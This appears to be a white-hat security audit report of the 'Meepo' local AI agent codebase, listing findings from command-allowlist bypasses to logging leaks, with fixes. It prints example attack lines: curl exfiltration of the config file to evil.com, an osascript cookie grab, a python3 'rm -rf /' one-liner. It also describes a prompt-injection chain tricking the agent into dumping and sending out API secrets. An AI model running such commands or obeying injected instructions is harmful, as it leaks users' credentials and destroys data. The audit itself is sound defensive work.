# Meepo Security Audit Report

**Date:** 2025-01-XX  
**Auditor:** Deep Security Audit (White Hat)  
**Scope:** Full codebase — 7 crates across the Meepo workspace  
**Methodology:** Manual source code review of all security-critical paths

---

## Executive Summary

Meepo demonstrates a **strong security posture** for a local AI agent. The codebase shows evidence of deliberate, defense-in-depth security engineering across most attack surfaces. Key strengths include a command allowlist, SSRF protection with DNS rebinding mitigation, AppleScript sanitization, constant-time token comparison, env-var allowlisting, and comprehensive input validation.

However, several findings of varying severity were identified. The most critical involve **command injection bypass vectors** in the `run_command` tool and a **TOCTOU race** in SSRF protection.

**Finding Summary:**
| Severity | Count |
|----------|-------|
| Critical | 2 |
| High     | 4 |
| Medium   | 7 |
| Low      | 5 |
| Info     | 4 |

---

## Critical Findings

### C-1: `run_command` Allowlist Bypass via `env` / `printenv` Exfiltration

**File:** `crates/meepo-core/src/tools/system.rs:159-233`  
**Severity:** Critical  
**CVSS:** 8.6

The `ALLOWED_COMMANDS` allowlist includes `env` and `printenv`. These commands dump **all environment variables**, which contain secrets like `ANTHROPIC_API_KEY`, `DISCORD_BOT_TOKEN`, `SLACK_BOT_TOKEN`, and `A2A_AUTH_TOKEN`.

An LLM-directed prompt injection attack could instruct the agent to run `env` or `printenv` and exfiltrate the output through any available channel (email, iMessage, Discord, Slack, or even `curl` which is also allowlisted).

**Attack chain:**
1. Attacker sends crafted message via any channel
2. Agent is tricked into calling `run_command` with `env`
3. All secrets are returned as tool output
4. Agent is tricked into sending output via `curl` to attacker-controlled server (also allowlisted)

**Recommendation:** Remove `env`, `printenv` from `ALLOWED_COMMANDS`. If environment inspection is needed, create a dedicated tool that redacts known secret patterns.

---

### C-2: `run_command` Allowlist Bypass — `curl` / `wget` Enable Full Exfiltration

**File:** `crates/meepo-core/src/tools/system.rs:206-208`  
**Severity:** Critical  
**CVSS:** 8.2

`curl` and `wget` are in the allowlist. Combined with C-1, an attacker can exfiltrate any data the agent can access:

```
curl -X POST https://evil.com/steal -d "$(cat ~/.meepo/config.toml)"
```

Wait — the `$(` operator is blocked. But `curl` can still be used with inline data:

```
curl https://evil.com/steal?key=VALUE
```

The agent can construct the URL with secrets embedded as query parameters. The `>` redirect is blocked, but `curl` itself is the exfiltration vector.

Additionally, `curl` bypasses the `is_safe_url()` SSRF protection entirely since it runs as a shell command, not through the `browse_url` tool.

**Recommendation:** Remove `curl` and `wget` from the allowlist, or route all HTTP requests through the `browse_url` tool which has SSRF protection. At minimum, add SSRF checks to any network-capable allowlisted commands.

---

## High Findings

### H-1: TOCTOU Race in SSRF DNS Resolution

**File:** `crates/meepo-core/src/tools/system.rs:544-566`  
**Severity:** High  
**CVSS:** 7.1

The `is_safe_url()` function resolves DNS and validates IPs *before* the actual HTTP request is made. Between the DNS check and the `reqwest` request, the DNS record can change (DNS rebinding). While the code comments acknowledge this risk, the mitigation is incomplete:

```rust
// DNS rebinding mitigation: resolve the hostname and validate all resolved IPs.
if let Ok(addrs) = std::net::ToSocketAddrs::to_socket_addrs(&resolve_target) {
    for addr in addrs {
        if let Some(reason) = is_private_ip(&addr.ip()) { ... }
    }
}
```

The resolution is done synchronously with `std::net::ToSocketAddrs`, but `reqwest` will perform its own async DNS resolution. An attacker with a short-TTL DNS record can pass the check with a public IP, then have the actual request resolve to `127.0.0.1`.

**Recommendation:** Use `reqwest`'s `resolve()` method to pin the resolved IP, or implement a custom DNS resolver that validates IPs at connection time. Alternatively, use `reqwest`'s `connect` callback to validate the resolved IP.

---

### H-2: `osascript` in `run_command` Allowlist Bypasses Browser JS Blocklist

**File:** `crates/meepo-core/src/tools/system.rs:229`  
**Severity:** High  
**CVSS:** 7.0

`osascript` is in the `ALLOWED_COMMANDS` list. This allows the agent to execute arbitrary AppleScript, completely bypassing:
- The `browser_execute_js` blocklist (document.cookie, localStorage, fetch, etc.)
- The `sanitize_applescript_string()` protections (since the command is passed via `sh -c`)
- All browser automation safety checks

An attacker could craft:
```
osascript -e 'tell application "Safari" to do JavaScript "document.cookie" in current tab of window 1'
```

This directly accesses cookies despite the blocklist in `browser.rs:312-338`.

**Recommendation:** Remove `osascript` from `ALLOWED_COMMANDS`. AppleScript execution should only go through the sanitized `run_applescript()` function in `platform/macos.rs`.

---

### H-3: `screenshot_page` Missing Path Validation (Chrome & Safari)

**File:** `crates/meepo-core/src/platform/macos.rs:901-922` and `1158-1179`  
**Severity:** High  
**CVSS:** 6.5

The `screenshot_page` methods in both `MacOsSafariBrowser` and `MacOsChromeBrowser` accept an optional `path` parameter but do **not** call `validate_screenshot_path()`. Only `MacOsScreenCaptureProvider::capture_screen()` (line 616) validates the path.

This means an attacker could write screenshots to arbitrary locations:
```
screenshot_page(path: "/etc/cron.d/malicious")
```

While `screencapture` writes PNG data (not executable), writing to sensitive directories is still a concern for overwriting files.

**Recommendation:** Add `validate_screenshot_path()` calls to both `MacOsSafariBrowser::screenshot_page()` and `MacOsChromeBrowser::screenshot_page()`.

---

### H-4: `get_cookies` Bypasses `browser_execute_js` Blocklist

**File:** `crates/meepo-core/src/platform/macos.rs:939-958` and `1196-1215`  
**Severity:** High  
**CVSS:** 6.8

Both Safari and Chrome `BrowserProvider` implementations have a `get_cookies()` method that directly executes `document.cookie` JavaScript. However, the `browser_execute_js` tool in `browser.rs:312-338` explicitly blocks `document.cookie` access.

The `get_cookies` method is exposed as a separate tool path that bypasses the JS blocklist entirely. If the agent is tricked into calling `get_cookies` instead of `browser_execute_js`, it can exfiltrate session cookies.

**Recommendation:** Either remove `get_cookies` from the `BrowserProvider` trait, or ensure it is not exposed as a tool. If cookie access is intentional, document the security implications and add rate limiting.

---

## Medium Findings

### M-1: A2A Server — No TLS, Plaintext HTTP

**File:** `crates/meepo-a2a/src/server.rs`  
**Severity:** Medium  
**CVSS:** 5.9

The A2A server uses raw TCP with hand-rolled HTTP parsing. There is no TLS support. Bearer tokens are transmitted in plaintext, making them vulnerable to network sniffing on non-localhost interfaces.

**Recommendation:** Add TLS support via `tokio-rustls`, or document that the A2A server must only bind to localhost. Consider adding a bind-address config option that defaults to `127.0.0.1`.

---

### M-2: A2A Server — Hand-Rolled HTTP Parser

**File:** `crates/meepo-a2a/src/server.rs:60-170`  
**Severity:** Medium  
**CVSS:** 5.5

The A2A server implements its own HTTP request parser instead of using a battle-tested library like `hyper` or `axum`. Hand-rolled parsers are prone to:
- HTTP request smuggling
- Header injection
- Incomplete edge-case handling (chunked encoding, keep-alive, etc.)

The current parser does basic `Content-Length` reading but doesn't handle chunked transfer encoding, HTTP/1.1 pipelining, or malformed headers robustly.

**Recommendation:** Replace with `hyper`, `axum`, or `warp` for HTTP handling.

---

### M-3: Slack Channel — No User Authorization

**File:** `crates/meepo-channels/src/slack.rs:294-358`  
**Severity:** Medium  
**CVSS:** 5.3

Unlike Discord (which has `allowed_users`) and iMessage (which has `allowed_contacts`), the Slack adapter has **no user allowlist**. Any user who can DM the bot can interact with the agent, potentially triggering tool execution.

The only check is `user == bot_uid` to skip the bot's own messages (line 300).

**Recommendation:** Add an `allowed_users` field to `SlackConfig` and validate `user` against it before processing messages, similar to Discord and iMessage.

---

### M-4: MCP Client — Arbitrary Command Execution

**File:** `crates/meepo-mcp/src/client.rs:41-53`  
**Severity:** Medium  
**CVSS:** 5.8

The MCP client spawns external processes based on config values:
```rust
let mut cmd = Command::new(&config.command);
cmd.args(&config.args)
```

If an attacker can modify `~/.meepo/config.toml`, they can specify any command as an MCP server, achieving arbitrary code execution. While this requires config file access, the config file permissions check is only a warning (not enforced).

**Recommendation:** Validate MCP server commands against an allowlist of known MCP server binaries, or require explicit user confirmation for new MCP server entries.

---

### M-5: `run_command` — `python` / `python3` / `node` in Allowlist

**File:** `crates/meepo-core/src/tools/system.rs:213-216`  
**Severity:** Medium  
**CVSS:** 5.5

`python`, `python3`, `node`, and `ruby` are in the allowlist. These interpreters can execute arbitrary code:
```
python3 -c "import os; os.system('rm -rf /')"
```

While the `>` and `$()` operators are blocked, Python/Node can perform network requests, file operations, and process spawning internally without shell operators.

**Recommendation:** Remove general-purpose interpreters from the allowlist, or restrict them to only execute specific script files within allowed directories.

---

### M-6: iMessage Logging Leaks Message Content

**File:** `crates/meepo-channels/src/imessage.rs:205`  
**Severity:** Medium  
**CVSS:** 4.3

```rust
info!("Forwarding iMessage from {}: {}", handle, content);
```

Full message content is logged at `info!` level. This could expose sensitive user communications in log files. Similar patterns exist in Slack (`slack.rs:353`) and Discord (`discord.rs:149`).

**Recommendation:** Log only metadata (sender, message length, channel) at info level. Log content only at `debug!` or `trace!` level.

---

### M-7: `browse_url` — Custom Headers Allow Auth Header Injection

**File:** `crates/meepo-core/src/tools/system.rs:678-691`  
**Severity:** Medium  
**CVSS:** 4.8

The `browse_url` tool accepts arbitrary custom headers. While CRLF injection is blocked, an attacker could set `Authorization`, `Cookie`, or `Host` headers to:
- Authenticate to internal services
- Override the Host header for virtual host routing
- Set cookies for session fixation

**Recommendation:** Add a blocklist of sensitive headers (`Authorization`, `Cookie`, `Host`, `X-Forwarded-For`, etc.) that cannot be set via the tool.

---

## Low Findings

### L-1: `mask_secret` Byte-Boundary Panic Risk

**File:** `crates/meepo-cli/src/config.rs:731-740`  
**Severity:** Low  
**CVSS:** 3.1

```rust
fn mask_secret(s: &str) -> String {
    if s.len() > 7 {
        format!("{}...{}", &s[..3], &s[s.len() - 4..])
    }
}
```

If the secret contains multi-byte UTF-8 characters, `&s[..3]` or `&s[s.len()-4..]` could panic at a non-character boundary. While API keys are typically ASCII, this is a latent bug.

**Recommendation:** Use `.chars()` iterator or `.get(..3)` with bounds checking.

---

### L-2: `validate_file_path` — `is_in_cwd` Overly Permissive

**File:** `crates/meepo-core/src/tools/system.rs:74`  
**Severity:** Low  
**CVSS:** 3.5

```rust
let is_in_cwd = canonical_path.starts_with(&current_dir);
```

The current working directory check allows file access relative to wherever the daemon was started. If started from `/`, this would allow access to the entire filesystem. The `filesystem.rs` tool uses a stricter `allowed_directories` config.

**Recommendation:** Remove the `is_in_cwd` check from `validate_file_path`, or ensure the daemon always starts from a safe directory.

---

### L-3: A2A Client — No SSRF Protection

**File:** `crates/meepo-a2a/src/client.rs:41-53`  
**Severity:** Low  
**CVSS:** 3.3

The A2A client makes HTTP requests to peer agent URLs from config without SSRF validation. If an attacker can modify the config to add a peer agent pointing to `http://169.254.169.254/` (cloud metadata), they could exfiltrate cloud credentials.

**Recommendation:** Apply `is_safe_url()` validation to A2A peer URLs, or at minimum validate they are not internal/metadata endpoints.

---

### L-4: `iMessage` — `send_imessage` No Timeout

**File:** `crates/meepo-channels/src/imessage.rs:253-257`  
**Severity:** Low  
**CVSS:** 2.5

```rust
let output = Command::new("osascript")
    .arg("-e")
    .arg(&applescript)
    .output()
    .await?;
```

Unlike `run_applescript()` in `platform/macos.rs` which has a 30-second timeout, the iMessage `send_imessage` method has no timeout. A hung AppleScript could block the channel indefinitely.

**Recommendation:** Wrap with `tokio::time::timeout()` consistent with `run_applescript()`.

---

### L-5: `AppleScript` Sanitization — Incomplete for Nested Quotes

**File:** `crates/meepo-core/src/platform/macos.rs:15-23`  
**Severity:** Low  
**CVSS:** 3.0

The `sanitize_applescript_string` function handles `\`, `"`, `\n`, `\r`, and control characters. However, AppleScript also uses single quotes in certain contexts and supports string concatenation with `&`. While the current sanitization prevents the known injection vector (`"; do shell script ...`), edge cases with AppleScript's string handling could exist.

**Recommendation:** Consider using AppleScript's `quoted form of` for shell-adjacent operations, and add fuzz testing for the sanitizer.

---

## Informational Findings

### I-1: No `unsafe` Code — Excellent

**Severity:** Info (Positive)

The only `unsafe` usage found is in `system.rs` for the `is_private_ip` function's standard library calls, which are safe. No raw pointer manipulation, no `unsafe impl`, no FFI. This is excellent for a Rust codebase.

---

### I-2: Config File Permissions — Warning Only

**File:** `crates/meepo-cli/src/config.rs:755-771`  
**Severity:** Info

The config loader checks file permissions and warns if group/other can read, but does not enforce it. The config file contains secrets (or references to env vars containing secrets).

**Recommendation:** Consider refusing to start if permissions are too open, similar to SSH's behavior with `~/.ssh/config`.

---

### I-3: Env Var Allowlist — Good Defense

**File:** `crates/meepo-cli/src/config.rs:815-825`  
**Severity:** Info (Positive)

The `ALLOWED_ENV_VARS` allowlist for config expansion is a strong defense against config-file-based env var exfiltration. Only 9 specific variables can be expanded.

---

### I-4: Rate Limiting Present on All Channels

**Severity:** Info (Positive)

All channel adapters (Discord, Slack, iMessage) implement rate limiting via `RateLimiter` (10 messages per 60 seconds per user). This prevents abuse and DoS through message flooding.

---

## Positive Security Controls Observed

1. **Command allowlist** with pipeline validation (`run_command`)
2. **SSRF protection** with DNS rebinding mitigation (`is_safe_url`)
3. **AppleScript sanitization** across all platform code
4. **Constant-time token comparison** in A2A server
5. **Path traversal prevention** with `canonicalize()` + directory checks
6. **Env var expansion allowlist** in config loading
7. **Secret masking** in all `Debug` impls for config structs
8. **Rate limiting** on all channel adapters
9. **LRU-bounded caches** preventing memory exhaustion
10. **Timeouts** on all external command execution
11. **Max body size** enforcement on A2A server
12. **Browser JS blocklist** preventing credential theft
13. **File size limits** on read/write operations
14. **CRLF injection prevention** in HTTP headers
15. **Element type allowlist** for UI automation

---

## Recommended Priority Actions

1. **[Critical]** Remove `env`, `printenv` from `ALLOWED_COMMANDS`
2. **[Critical]** Remove or restrict `curl`, `wget` from `ALLOWED_COMMANDS`
3. **[High]** Remove `osascript` from `ALLOWED_COMMANDS`
4. **[High]** Add `validate_screenshot_path()` to browser `screenshot_page` methods
5. **[High]** Fix TOCTOU in SSRF by pinning resolved IPs
6. **[High]** Restrict or remove `get_cookies` from browser tools
7. **[Medium]** Add user allowlist to Slack channel adapter
8. **[Medium]** Remove `python`/`python3`/`node`/`ruby` from `ALLOWED_COMMANDS` or sandbox them
9. **[Medium]** Add sensitive header blocklist to `browse_url`
10. **[Medium]** Reduce log verbosity for message content
